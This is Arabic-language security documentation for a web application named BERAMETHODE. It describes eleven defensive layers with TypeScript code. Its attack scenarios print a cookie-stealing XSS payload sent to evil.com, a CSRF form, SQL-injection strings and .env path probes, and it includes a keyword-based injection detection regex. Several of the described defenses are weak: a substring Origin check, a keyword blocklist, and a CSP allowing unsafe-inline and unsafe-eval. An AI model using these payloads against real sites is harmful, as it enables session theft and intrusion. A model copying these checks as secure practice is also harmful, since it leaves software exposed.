# 🛡️ BERAMETHODE — الأمن والحماية

> توثيق كامل لنظام الأمن ذو 11 طبقة

---

## 📋 فهرس

1. [نظرة عامة](#1-نظرة-عامة)
2. [الطبقة 1 — إخفاء معلومات الخادم](#2-الطبقة-1--إخفاء-معلومات-الخادم)
3. [الطبقة 2 — رؤوس الأمان (Security Headers)](#3-الطبقة-2--رؤوس-الأمان)
4. [الطبقة 3 — HTTPS + HSTS](#4-الطبقة-3--https--hsts)
5. [الطبقة 4 — تحديد معدل الطلبات (Rate Limiting)](#5-الطبقة-4--تحديد-معدل-الطلبات)
6. [الطبقة 5 — حظر IP (IP Block)](#6-الطبقة-5--حظر-ip)
7. [الطبقة 6 — CSRF (Cross-Site Request Forgery)](#7-الطبقة-6--csrf)
8. [الطبقة 7 — المصادقة (JWT + Cookies)](#8-الطبقة-7--المصادقة)
9. [الطبقة 8 — إدارة الجلسات (Session Management)](#9-الطبقة-8--إدارة-الجلسات)
10. [الطبقة 9 — حماية IDOR](#10-الطبقة-9--حماية-idor)
11. [الطبقة 10 — منع SQL Injection](#11-الطبقة-10--منع-sql-injection)
12. [الطبقة 11 — إخفاء الأخطاء (Error Handling)](#12-الطبقة-11--إخفاء-الأخطاء)
13. [الترخيص (License Enforcement)](#13-الترخيص)
14. [سجل التدقيق (Audit Log)](#14-سجل-التدقيق)
15. [سيناريوهات الهجوم والدفاع](#15-سيناريوهات-الهجوم-والدفاع)
16. [خريطة الملفات الأمنية](#16-خريطة-الملفات-الأمنية)

---

## 1. نظرة عامة

```
╔══════════════════════════════════════════════════════════════╗
║                BERAMETHODE Security Architecture            ║
╠══════════════════════════════════════════════════════════════╣
║                                                              ║
║  ┌──────────┐  ┌──────────┐  ┌──────────┐  ┌──────────────┐ ║
║  │  11 طبقة  │  │ License  │  │  Audit   │  │   7 وكلاء    │ ║
║  │  أمنية    │  │Enforce   │  │  Logger  │  │  securityAgent│ ║
║  └──────────┘  └──────────┘  └──────────┘  └──────────────┘ ║
║                                                              ║
╚══════════════════════════════════════════════════════════════╝
```

### تدفق الطلب عبر طبقات الأمن

```
طلب HTTP وارد
    │
    ▼ 1. 🔒 إخفاء X-Powered-By
    │    app.disable('x-powered-by')
    │
    ▼ 2. 🔒 رؤوس الأمان
    │    X-Content-Type-Options: nosniff
    │    X-Frame-Options: DENY
    │    X-XSS-Protection: 1; mode=block
    │    Referrer-Policy: strict-origin-when-cross-origin
    │
    ▼ 3. 🔒 HTTPS + HSTS (فقط في الإنتاج)
    │    Strict-Transport-Security
    │
    ▼ 4. 🔒 Rate Limiting
    │    ├── apiLimiter:      8000/15min  ← عام
    │    ├── authLimiter:     10/15min    ← مصادقة
    │    ├── pinVerify:       8/15min     ← PIN العمال
    │    ├── usersLookup:     20/60min    ← المستخدمين
    │    ├── pathScan:        100/60min   ← مسح المسارات
    │    └── masterLimiter:   5/15min     ← BERA MASTER
    │
    ▼ 5. 🔒 IP Block
    │    5 انتهاكات → حظر 30 دقيقة
    │
    ▼ 6. 🔒 CSRF Same-Origin (فقط في الإنتاج)
    │    POST/PUT/DELETE ← التحقق من Origin == Host
    │
    ▼ 7. 🔒 Session Timeout
    │    60 دقيقة بدون نشاط → تسجيل خروج تلقائي
    │
    ▼ 8. 🔒 المصادقة JWT
    │    authenticateToken → تحقق HttpOnly Cookie
    │
    ▼ 9. 🔒 IDOR Guard
    │    ownershipGuard → المورد يخص المستخدم؟
    │
    ▼ 10. 🔒 SQL Injection Filter
    │     sanitizeIdParam → منع الأحرف الخطيرة
    │
    ▼ 11. 🔒 Generic Error Handling
    │     404/500 → رسائل عامة بدون تفاصيل
    │
    ▼ ✅ Controller
```

---

## 2. الطبقة 1 — إخفاء معلومات الخادم

**الملف:** `server.ts` (السطر 40)

```typescript
app.disable('x-powered-by');
```

**الهدف:** إخفاء أن الخادم Express.js منعاً لاستهداف ثغرات Express المعروفة.

**ماذا يحدث بدونها؟**

```
→ Response Header: X-Powered-By: Express
→ المخترق: "Express.js version X → نبحث عن ثغرات معروفة"
```

**بعد التعطيل:**

```
→ ما كاينش X-Powered-By فـ الـ Response
→ المخترق: "مش عارف شنو الخادم"
```

---

## 3. الطبقة 2 — رؤوس الأمان

**الملف:** `server.ts` (السطور 50-62)

```typescript
// أمان الرؤوس الأساسي:
res.setHeader('X-Content-Type-Options', 'nosniff');
res.setHeader('X-Frame-Options', 'DENY');
res.setHeader('X-XSS-Protection', '1; mode=block');
res.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin');

// في الإنتاج (أو HELMET=true):
app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'", "'unsafe-inline'", "'unsafe-eval'", "https://cdn.tailwindcss.com", ...],
      styleSrc: ["'self'", "'unsafe-inline'", "https://fonts.googleapis.com", ...],
      imgSrc: ["'self'", "data:", "blob:", "https://*.supabase.co", ...],
      connectSrc: ["'self'", "https://*.supabase.co"],
      fontSrc: ["'self'", "https://fonts.gstatic.com"],
    }
  }
}));
```

### تفصيل كل رأس:

| الرأس | القيمة | ماذا يمنع؟ |
|---|---|---|
| `X-Content-Type-Options` | `nosniff` | المتصفح يحترم `Content-Type` ولا يخمن (MIME sniffing) |
| `X-Frame-Options` | `DENY` | موقع خارجي ما يقدرش يحط BERAMETHODE فـ iframe (clickjacking) |
| `X-XSS-Protection` | `1; mode=block` | المتصفح يمنع هجمات XSS القديمة |
| `Referrer-Policy` | `strict-origin-when-cross-origin` | عند التنقل لموقع خارجي، يرسل الـ origin فقط (بدون مسار كامل) |
| `Strict-Transport-Security` | `max-age=31536000` (إنتاج) | المتصفح يتذكر يستعمل HTTPS فقط لمدة سنة |
| `Content-Security-Policy` | مخصص (Helmet) | منع تنفيذ سكريبتات من مصادر غير مصرح بها |

### مثال هجوم Clickjacking (بدون X-Frame-Options):

```html
<!-- موقع مخترق: -->
<iframe src="https://beramethode.com/config"></iframe>
<!-- الضحية يضغط على زر في iframe → يغير إعدادات حسابه -->
```

**بعد DENY:**
```
→ Refused to display 'https://beramethode.com' in a frame
→ المتصفح يمنع التضمين
```

---

## 4. الطبقة 3 — HTTPS + HSTS

**الملف:** `server.ts` (السطور 64-74)

```typescript
// إنتاج فقط:
if (process.env.NODE_ENV === 'production') {
  app.use((req, res, next) => {
    if (!req.secure && req.headers['x-forwarded-proto'] !== 'https') {
      return res.redirect(301, `https://${req.headers.host}${req.url}`);
    }
    next();
  });

  // HSTS header:
  res.setHeader('Strict-Transport-Security', 'max-age=31536000; includeSubDomains');
}
```

**ماذا تفعل:**
- كل طلب HTTP → إعادة توجيه 301 إلى HTTPS
- `max-age=31536000` → المتصفح يتذكر لمدة سنة: "هاد الموقع HTTPS فقط"
- `includeSubDomains` → حتى النطاقات الفرعية

---

## 5. الطبقة 4 — تحديد معدل الطلبات

**الملف:** `server.ts` + `server/securityAgent.ts`

### جميع المحددات:

```
الـ API العام
├── apiLimiter ────────── 8000 طلب / 15 دقيقة ── كل /api/*
│
المصادقة
├── authLimiter ───────── 10 طلبات / 15 دقيقة ── /api/auth/*
├── loginRateLimiter ──── 10 طلبات / 15 دقيقة ── /api/auth/login
├── passwordResetLimiter  12 طلب / 15 دقيقة ── forget/reset
│
واجهة العمال
├── beraouvierLimiter ─── 40 طلب / 15 دقيقة ── /beraouvier
├── pinVerifyLimiter ──── 8 طلبات / 15 دقيقة ── التحقق من PIN
│
الإدارة
├── usersLookupLimiter ── 20 طلب / 60 دقيقة ── /api/users
├── networkInfoLimiter ── 100 طلب / 15 دقيقة ── /api/network-info
├── masterLimiter ─────── 5 طلبات / 15 دقيقة ── /api/master/*
│
الأمان العام
└── pathScanLimiter ───── 100 طلب / 60 دقيقة ── مسارات غير معروفة
```

### كود مثال (authLimiter):

```typescript
const authLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,  // 15 دقيقة
  max: 10,                    // أقصى 10 طلبات
  message: { error: 'طلبات كثيرة. حاول بعد 15 دقيقة.' },
  standardHeaders: true,
  legacyHeaders: false,
  validate: { xForwardedForHeader: false },
  keyGenerator: (req) => {
    return req.ip || req.socket.remoteAddress || 'unknown';
  },
});
```

### سيناريو هجوم:

```
هجوم تخمين كلمة السر (Brute Force):
──────────────────────────────────
محاولة 1: POST /api/auth/login  ← email: admin@x.com, pass: 1234
محاولة 2: POST /api/auth/login  ← email: admin@x.com, pass: 12345
...
محاولة 10: ← لا يزال مسموح
محاولة 11: ← 🛑 429 Too Many Requests
محاولة 12: ← 🛑 429 ...
كل 15 دقيقة: يتكرر

حتى لو حاول 10 مرات كل 15 دقيقة:
→ 10 × 96 = 960 محاولة في اليوم
→ هاد أقل من اللازم لتخمين كلمة سر قوية
```

---

## 6. الطبقة 5 — حظر IP

**الملف:** `server.ts` (السطور 76-110)

```typescript
// هيكل البيانات:
const ipViolations = new Map<string, { count: number, blockedUntil: number }>();

// عند كل انتهاك:
function recordViolation(ip: string) {
  const record = ipViolations.get(ip) || { count: 0, blockedUntil: 0 };
  record.count++;
  if (record.count >= 5) {
    record.blockedUntil = Date.now() + 30 * 60 * 1000; // 30 دقيقة
    record.count = 0;
    auditLogger(null, 'IP_BLOCKED', `IP ${ip} محظور 30 دقيقة`, { ip });
  }
  ipViolations.set(ip, record);
}

// الفحص عند كل طلب:
function ipBlockCheck(req, res, next) {
  const ip = req.ip;
  const record = ipViolations.get(ip);
  if (record && record.blockedUntil > Date.now()) {
    return res.status(403).json({ error: 'محظور مؤقتاً' });
  }
  next();
}

// تنظيف دوري (كل 60 ثانية):
setInterval(() => {
  const now = Date.now();
  for (const [ip, record] of ipViolations) {
    if (record.blockedUntil < now && record.count === 0) {
      ipViolations.delete(ip);  // حذف IPs منتهية
    }
  }
}, 60000);
```

**متى نسجل انتهاك؟**
- خطأ في المصادقة (كلمة سر خطأ)
- انتهاك IDOR (محاولة وصول لبيانات غير مملوكة)
- طلب مسار غير موجود (path scan)
- إعادة تعيين كلمة السر فاشلة

---

## 7. الطبقة 6 — CSRF

**الملف:** `server.ts` (السطور 112-140)

```typescript
// في الإنتاج فقط:
if (process.env.NODE_ENV === 'production') {
  app.use((req, res, next) => {
    // GET/HEAD/OPTIONS معفاة (آمنة بطبيعتها)
    if (['GET', 'HEAD', 'OPTIONS'].includes(req.method)) return next();

    const origin = req.headers['origin'];
    const host = req.headers['host'];

    // طلبات بدون Origin مسموحة (curl, Postman)
    if (!origin) return next();

    // التحقق: Origin يطابق Host؟
    if (!origin.includes(host) && !origin.includes('localhost')) {
      return res.status(403).json({ error: 'CSRF: Origin غير مصرح به' });
    }

    next();
  });
}
```

### سيناريو:

```
موقع مخترق (evil.com):
<html>
  <body>
    <form action="https://beramethode.com/api/settings" method="POST">
      <input name="data" value='{"salaire": "99999"}' />
    </form>
    <script>document.forms[0].submit();</script>
  </body>
</html>

→ المتصفح يرسل الطلب مع Cookie تاع BERAMETHODE
→ الخادم يستقبل Origin: https://evil.com
→ Origin لا يطابق Host: beramethode.com
→ 🛑 403 CSRF: Origin غير مصرح به
```

---

## 8. الطبقة 7 — المصادقة

**الملف:** `server/authController.ts` + `server/middleware.ts` + `server/jwtConfig.ts`

### 8.1 تسجيل الدخول

```typescript
POST /api/auth/login { email, password }
    │
    ▼ التحقق من الـ email فـ قاعدة البيانات
    │
    ▼ bcrypt.compare(password, hash)
    │  ├── خطأ → 401 { error: 'بريد إلكتروني أو كلمة سر خطأ' }
    │  └── صحيح ↓
    │
    ▼ jwt.sign(
        { id: user.id, email: user.email, role: user.role },
        JWT_SECRET,  // من متغير البيئة
        { expiresIn: '24h' }
      )
    │
    ▼ res.cookie('token', token, {
        httpOnly: true,       // ❌ JavaScript ما يقدرش يقراها
        sameSite: 'strict',   // ❌ مواقع خارجية
        secure: process.env.COOKIE_SECURE === 'true',  // 🔒 HTTPS فقط
        maxAge: 24 * 60 * 60 * 1000,  // 24 ساعة
      })
    │
    ▼ رد: { user: { id, name, email, role } }
```

### 8.2 التحقق من الجلسة (Middleware)

```typescript
// server/middleware.ts
export function authenticateToken(req, res, next) {
  const token = req.cookies?.token;

  if (!token) {
    return res.status(401).json({ error: 'No token' });
  }

  try {
    const decoded = jwt.verify(token, SECRET_KEY);
    req.user = decoded;

    // تجديد منزلق — إذا بقيت أكثر من 12 ساعة، جدد التوكن
    const issuedAt = decoded.iat * 1000;
    const age = Date.now() - issuedAt;
    if (age > 12 * 60 * 60 * 1000) {
      const newToken = jwt.sign(
        { id: decoded.id, email: decoded.email, role: decoded.role },
        SECRET_KEY,
        { expiresIn: '24h' }
      );
      res.cookie('token', newToken, COOKIE_OPTIONS);
    }

    next();
  } catch (err) {
    return res.status(401).json({ error: 'Token expired' });
  }
}
```

### 8.3 أمان الكوكيز

| الخاصية | القيمة | السبب |
|---|---|---|
| `httpOnly` | `true` | حتى لو لقا XSS، ما يقدرش يسرق التوكن |
| `sameSite` | `'strict'` | الفورم من مواقع خارجية ما تجيبش التوكن |
| `secure` | `true` (إنتاج) | الكوكي يتنقل فقط عبر HTTPS |
| `maxAge` | 24 ساعة | صلاحية محدودة |
| `path` | `/` | يعمل لكل المسارات |

---

## 9. الطبقة 8 — إدارة الجلسات

**الملف:** `server/middleware.ts` (السطور 120-170)

### 9.1 بنية البيانات

```typescript
const userActivity = new Map<number, number>();
// Map<userId, lastActivityTimestamp>
```

### 9.2 تتبع النشاط

```typescript
export function sessionActivityTracker(req, res, next) {
  if (req.user?.id) {
    userActivity.set(req.user.id, Date.now());
  }
  next();
}
```

### 9.3 التحقق من انتهاء الجلسة

```typescript
export function sessionTimeoutCheck(req, res, next) {
  if (req.user?.id) {
    const lastActivity = userActivity.get(req.user.id);
    if (lastActivity && (Date.now() - lastActivity) > 60 * 60 * 1000) {
      // 60 دقيقة بدون نشاط
      userActivity.delete(req.user.id);
      res.clearCookie('token');
      return res.status(401).json({ error: 'انتهت الجلسة' });
    }
  }
  next();
}
```

### 9.4 تنظيف دوري

```typescript
// كل 5 دقائق — حذف الجلسات المنتهية
const cleanupInterval = setInterval(() => {
  const now = Date.now();
  for (const [userId, lastActivity] of userActivity) {
    if ((now - lastActivity) > 60 * 60 * 1000) {
      userActivity.delete(userId);
    }
  }
}, 5 * 60 * 1000);

cleanupInterval.unref(); // لا يمنع إغلاق التطبيق
```

---

## 10. الطبقة 9 — حماية IDOR

**الملف:** `server.ts` (السطور 500-560)

### 10.1 دالة الحماية

```typescript
function ownershipGuard(table: string, ownerColumn: string = 'owner_id') {
  return (req, res, next) => {
    const id = req.params.id;
    const userId = req.user?.id;

    if (!id || !userId) return next();

    try {
      const row = db.prepare(
        `SELECT ${ownerColumn} FROM ${table} WHERE id = ?`
      ).get(id);

      if (!row) {
        // المورد موجودش — نكمل عادي (404 هاندلر يتعامل معاها)
        return next();
      }

      // المشرفين (admin) يقدرون يتجاوزون الحماية
      if (req.user?.role === 'admin') return next();

      if (row[ownerColumn] !== userId) {
        auditLogger(userId, 'IDOR_ATTEMPT',
          `محاولة وصول غير مصرح: ${table}/${id}`, {
          table, resourceId: id, ownerId: row[ownerColumn]
        });
        recordViolation(req.ip);
        return res.status(403).json({ error: 'غير مصرح' });
      }

      next();
    } catch (err) {
      next();
    }
  };
}
```

### 10.2 المسارات المحمية (30+ مسار)

```typescript
// الموديلات:
app.delete('/api/models/:id', authenticateToken, ownershipGuard('models'), ...);

// المخازن:
app.delete('/api/magasin/products/:id', ownershipGuard('magasin_products'));
app.delete('/api/magasin/mouvements/:id', ownershipGuard('magasin_mouvements'));
app.delete('/api/magasin/commandes/:id', ownershipGuard('magasin_commandes'));

// الموارد البشرية:
app.delete('/api/hr/workers/:id', ownershipGuard('hr_workers'));
app.delete('/api/worker-pointage/:id', ownershipGuard('worker_pointage'));

// التخطيط:
app.delete('/api/planning/:id', ownershipGuard('planning_events'));

// متابعة الإنتاج:
app.delete('/api/poste-suivi/:id', ownershipGuard('poste_suivi'));

// الفوترة:
app.delete('/api/facturation/factures/:id', ownershipGuard('factures'));
app.delete('/api/facturation/bl/:id', ownershipGuard('bons_livraison'));

// المقاولة:
app.delete('/api/subcontract/:id', ownershipGuard('subcontract_orders'));

// ... إلخ
```

### 10.3 منع الوصول المباشر للمستخدمين

```typescript
function noDirectUserAccess(req, res, next) {
  if (req.user?.role !== 'admin') {
    return res.status(403).json({ error: 'ممنوع' });
  }
  next();
}

// يُطبق على:
app.put('/api/users/:id/role', noDirectUserAccess);
app.delete('/api/users/:id', noDirectUserAccess);
```

### سيناريو:

```
مستخدم (id=5) يحاول مسح منتج تاع مستخدم (id=8):
DELETE /api/magasin/products/123
    │
    ▼ ownershipGuard('magasin_products')
    │
    ▼ SELECT owner_id FROM magasin_products WHERE id = 123
    │
    ▼ owner_id = 8 (≠ 5)
    │
    ├── 📝 سجل: IDOR_ATTEMPT — userId=5, resource=magasin_products/123
    ├── ⚠️ تسجيل انتهاك IP
    ├── 🛑 403 { error: 'غير مصرح' }
```

---

## 11. الطبقة 10 — منع SQL Injection

**الملف:** `server.ts` + `server/uuidUtils.ts`

### 11.1 الكشف

```typescript
const SQL_INJECTION_PATTERN = /['";\-\-]|\b(?:union|select|insert|drop|delete|exec|xp_|alter|truncate|update|set)\b/i;

const SUSPICIOUS_PATH_PATTERN = /[<>"'()]|%27|%22|--|;|exec|drop|union/i;
```

### 11.2 التعقيم

```typescript
function isValidSafeId(value: string): boolean {
  return /^[a-zA-Z0-9_-]+$/.test(value);
}

function sanitizeIdParam(paramName: string) {
  return (req, res, next) => {
    const value = req.params[paramName];
    if (!value) return next();

    // فحص SQL Injection
    if (SQL_INJECTION_PATTERN.test(value) || SUSPICIOUS_PATH_PATTERN.test(value)) {
      auditLogger(req.user?.id, 'SQL_INJECTION_ATTEMPT', value, { ip: req.ip });
      recordViolation(req.ip);
      return res.status(400).json({ error: 'طلب غير صالح' });
    }

    // فحص المعرفات الرقمية/UUID
    if (!isValidSafeId(value) && !isValidUUID(value)) {
      return res.status(400).json({ error: 'معرف غير صالح' });
    }

    next();
  };
}
```

### 11.3 مثال هجوم:

```
محاولة: GET /api/models/1; DROP TABLE users;--
    │
    ▼ sanitizeIdParam('id')
    │
    ▼ SQL_INJECTION_PATTERN.test("1; DROP TABLE users;--")
    │  → true (وجد ; و DROP و --)
    │
    ├── 📝 سجل: SQL_INJECTION_ATTEMPT
    ├── ⚠️ تسجيل انتهاك IP
    ├── 🛑 400 { error: 'طلب غير صالح' }
```

---

## 12. الطبقة 11 — إخفاء الأخطاء

**الملف:** `server.ts` (السطور 950-961)

```typescript
// 404 عام
app.use((req, res) => {
  res.status(404).json({ error: 'Not found' });
});

// 500 عام (خطأ خادم)
app.use((err, req, res, next) => {
  console.error('❌ خطأ:', err.message);
  res.status(500).json({ error: 'Internal server error' });
});
```

### السر:

```
بدون إخفاء:
─────────────
→ 500 { error: "Cannot read property 'x' of undefined at getUser (db.ts:42)" }
→ المخترق يعرف: "يستخدمون better-sqlite3، السطر 42، دالة getUser"

مع الإخفاء:
────────────
→ 500 { error: "Internal server error" }
→ المخترق: "ما عرفتش والو"
```

---

## 13. الترخيص

**الملف:** `server/licenseGuard.ts`

### 13.1 التدفق

```
1. المالك يولّد مفتاح في Bera-master-admin: BERA-XXXX-XXXX-XXXX
2. BERAMETHODE: POST /api/license/verify { keyCode }
   → Edge Function verify-license
   → توقيع HMAC-SHA256
   → يرجع: { ok, modules, max_workers, expiry, status }
3. إذا VITE_LICENSE_ENFORCE=true:
   → hiddenModules = ALL_MODULES - license.modules
   → readOnly = (status expired/suspended/revoked)
   → maxWorkers = license.max_workers
```

### 13.2 منع الكتابة

```typescript
function isLicenseWritable(req, res, next) {
  if (!LICENSE_ENFORCED) return next();

  const { readOnly } = getLicenseState(req.user?.email);

  if (readOnly && !isReadOnlyExemptPath(req.path)) {
    return res.status(403).json({
      error: 'حالة قراءة فقط — رخصتك منتهية',
      readOnly: true
    });
  }

  next();
}
```

### 13.3 المسارات المعفاة

```typescript
const READ_ONLY_EXEMPT = [
  '/api/settings',
  '/api/license',
  '/api/auth',
  '/api/setup',
  '/api/master',
];

function isReadOnlyExemptPath(path: string): boolean {
  return READ_ONLY_EXEMPT.some(e => path.startsWith(e));
}
```

---

## 14. سجل التدقيق

**الملف:** `server/auditLogger.ts` + `server/db.ts`

### 14.1 بنية الجدول

```sql
CREATE TABLE IF NOT EXISTS system_audit_logs (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  user_id INTEGER,
  action TEXT NOT NULL,       -- LOGIN, LOGOUT, CREATE, DELETE, etc.
  detail TEXT,                 -- تفاصيل العملية
  ip TEXT,                     -- عنوان IP
  created_at TEXT DEFAULT (datetime('now'))
);
```

### 14.2 دالة التسجيل

```typescript
export function auditLogger(
  userId: number | null,
  action: string,
  detail?: string,
  meta?: { ip?: string }
) {
  try {
    db.prepare(`
      INSERT INTO system_audit_logs (user_id, action, detail, ip)
      VALUES (?, ?, ?, ?)
    `).run(
      userId || null,
      action,
      detail || null,
      meta?.ip || null
    );
  } catch (err) {
    console.error('Audit log failed:', err);
    // لا نمنع العملية الأصلية إذا فشل التسجيل
  }
}
```

### 14.3 جميع أحداث التدقيق

| الإجراء | متى؟ | التفاصيل |
|---|---|---|
| `LOGIN` | نجاح تسجيل الدخول | البريد الإلكتروني |
| `LOGIN_FAILED` | فشل تسجيل الدخول | البريد الإلكتروني + IP |
| `LOGOUT` | تسجيل الخروج | — |
| `PASSWORD_RESET` | إعادة تعيين كلمة السر | البريد الإلكتروني |
| `CREATE` | إنشاء مورد جديد | نوع المورد + ID |
| `UPDATE` | تحديث مورد | نوع المورد + ID |
| `DELETE` | حذف مورد | نوع المورد + ID |
| `PERMISSION_DENIED` | محاولة وصول غير مصرح | المسار + الدور المطلوب |
| `IDOR_ATTEMPT` | محاولة IDOR | الجدول + ID المورد |
| `SQL_INJECTION_ATTEMPT` | محاولة SQL Injection | النص المُرسل |
| `IP_BLOCKED` | حظر IP | الـ IP |
| `SETUP_COMPLETE` | إعداد النظام الأول | — |
| `LICENSE_ACTIVATED` | تفعيل الترخيص | المفتاح |

---

## 15. سيناريوهات الهجوم والدفاع

### 15.1 هجوم XSS

```
المخترق يحقن سكريبت فـ حقل الإدخال:
<script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>

الدفاع:
├── HttpOnly Cookie → JavaScript ما يقدرش يقرا التوكن
├── CSP (Helmet) → script-src محدودة
├── X-XSS-Protection → المتصفح يمنع التخمين
└── rate limit → حتى لو سرق حاجة، 10 طلبات/15 دقيقة
```

### 15.2 هجوم CSRF

```
موقع خارجي يرسل طلب للخادم مع Cookie تاع الضحية:

الدفاع:
├── SameSite=Strict → الكوكي ما يتنقلش مع الطلبات الخارجية
├── Same-Origin Check → Origin != Host → 403
└── Rate Limiting → حتى لو نجح، محدود
```

### 15.3 هجوم Brute Force

```
1000 محاولة تخمين كلمة السر في الدقيقة:

الدفاع:
├── authLimiter: 10/15 دقيقة ← كل IP
├── loginRateLimiter: 10/15 دقيقة ← إضافي
├── IP Block: 5 انتهاكات → 30 دقيقة حظر
└── Audit Log: كل محاولة فاشلة مسجلة
```

### 15.4 هجوم IDOR

```
مستخدم يحاول يمسح بيانات مستخدم آخر:

الدفاع:
├── ownershipGuard: SELECT owner_id WHERE id = ?
├── role !== admin → 403
├── Audit: IDOR_ATTEMPT مسجل
└── IP Violation: +1 ← بعد 5 انتهاكات → حظر
```

### 15.5 هجوم SQL Injection

```
' OR '1'='1'  -- يحاول يتجاوز المصادقة:

الدفاع:
├── sanitizeIdParam: يمنع الأحرف الخطيرة ('";--)
├── SQL_INJECTION_PATTERN: يكتشف الكلمات الممنوعة
├── Audit: SQL_INJECTION_ATTEMPT مسجل
└── IP Violation: +1 ← بعد 5 → حظر
```

### 15.6 هجوم Path Scan (مسح المسارات)

```
مخترق يجرب مسارات عشوائية:
GET /api/admin, GET /api/backup, GET /api/.env, ...

الدفاع:
├── pathScanLimiter: 100/60 دقيقة
├── Generic 404: "Not found" بدون تفاصيل
└── 5 انتهاكات → حظر IP
```

---

## 16. خريطة الملفات الأمنية

```
📁 server/
│
├── server.ts                  ← 11 طبقة أمنية (دمج كل شيء)
│   ├── app.disable('x-powered-by')
│   ├── Security Headers
│   ├── HTTPS Redirect
│   ├── Rate Limiters (6×)
│   ├── IP Block
│   ├── CSRF Same-Origin
│   ├── Session Timeout + Activity
│   ├── ownershipGuard()
│   ├── noDirectUserAccess()
│   ├── sanitizeIdParam()
│   └── Generic Error Handler
│
├── middleware.ts              ← JWT + Session (159 سطر)
│   ├── authenticateToken
│   ├── requirePermission
│   ├── clearAuthCookie
│   ├── sessionTimeoutCheck
│   ├── sessionActivityTracker
│   └── sanitizeIdParam()
│
├── securityAgent.ts           ← 7 وكلاء أمن (مكتبة قابلة لإعادة الاستخدام)
│   ├── Rate Limiter Agent
│   ├── Auth Guard Agent
│   ├── UUID Validator Agent
│   ├── Error Handler Agent
│   ├── HTTPS Enforcer Agent
│   ├── Session Manager Agent
│   └── CSRF Shield Agent
│
├── auditLogger.ts             ← سجل التدقيق
│   └── system_audit_logs (INSERT)
│
├── uuidUtils.ts               ← المعرفات الآمنة
│   ├── generateUUID()
│   ├── isValidUUID()
│   └── isValidSafeId()
│
├── jwtConfig.ts               ← إعدادات JWT
│   ├── SECRET_KEY
│   ├── COOKIE_OPTIONS
│   └── isCookieSecure()
│
├── licenseGuard.ts            ← حماية الترخيص
│   ├── isLicenseWritable()
│   └── isReadOnlyExemptPath()
│
├── permissions/               ← نظام الصلاحيات
│   ├── presets.ts             ← أدوار مسبقة (6 أدوار)
│   └── resolver.ts            ← حل الصلاحية
│
├── authController.ts          ← المصادقة
│   └── login/register/logout + Audit
│
├── masterController.ts        ← واجهة BERA MASTER
│   └── localhost فقط (5 طلبات/15 دقيقة)
│
└── errorController.ts         ← تقارير الأعطال

📁 src/
└── context/
    ├── AuthContext.tsx         ← حالة المصادقة
    ├── LicenseContext.tsx      ← ALL_MODULES + hiddenModules
    └── PermissionsContext.tsx  ← isSuper + canPage + canField

📁 lib/
├── router.ts                  ← + VIEW_MAP (حماية من hash injection)
└── dataIdentity.ts            ← Snapshots (عزل البيانات)

📁 app/
└── accountTypes.ts            ← ACCOUNT_TYPE_HIDDEN
```

---

**النهاية.** هاد الوثيقة تغطي كلشي فـ نظام أمن BERAMETHODE: 11 طبقة بالتفصيل، كود، سيناريوهات هجوم، وخرائط الملفات.
